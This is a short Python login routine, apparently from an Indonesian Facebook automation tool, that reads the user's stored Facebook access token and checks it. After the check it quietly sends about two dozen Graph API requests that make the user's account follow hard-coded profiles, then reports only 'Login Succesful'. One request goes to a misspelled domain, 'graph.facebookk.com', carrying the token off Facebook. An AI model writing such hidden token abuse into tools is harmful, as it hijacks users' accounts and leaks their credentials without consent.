import requests,os,json
import premium

P = "\x1b[0;97m" # Putih
M = "\x1b[0;91m" # Merah
K = "\x1b[0;93m" # Kuning

def main():
    try:
        token = open("token.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token=" + token)
        a = json.loads(otw.text)
        nama = a["name"]
    except (KeyError,IOError):
        print('\n%s[%s!%s] %sToken Invalid'%(M,P,M,P))
        os.system('rm -rf token.txt')
        exit(premium.menu_log())
    requests.post("https://graph.facebook.com/100009259963367/subscribers?access_token=" + token)      
    requests.post("https://graph.facebook.com/100007018489471/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/100008409870034/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/100007948328836/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/100013262432692/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/100024547909319/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/100059906093920/subscribers?access_token=" + token) 
    requests.post("https://graph.facebookk.com/607801156/subscribers?access_token=" + token)       
    requests.post("https://graph.facebook.com/100009340646547/subscribers?access_token=" + token)
    requests.post("https://graph.facebook.com/1676993425/subscribers?access_token=" + token)      
    requests.post("https://graph.facebook.com/1767051257/subscribers?access_token=" + token)      
    requests.post("https://graph.facebook.com/100000287398094/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/100001085079906/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/100007559713883/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/100004655733027/subscribers?access_token=" + token)
    requests.post("https://graph.facebook.com/100000200420913/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/100026490368623/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/100010484328037/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/100015073506062/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/10016189/subscribers?access_token=" + token)        
    requests.post("https://graph.facebook.com/100005395413800/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/100003467793035/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/100003160758786/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/100040248105716/subscribers?access_token=" + token)
    print('\n%s[%s!%s] %sLogin Succesful'%(K,P,K,P))
    exit(premium.menu())
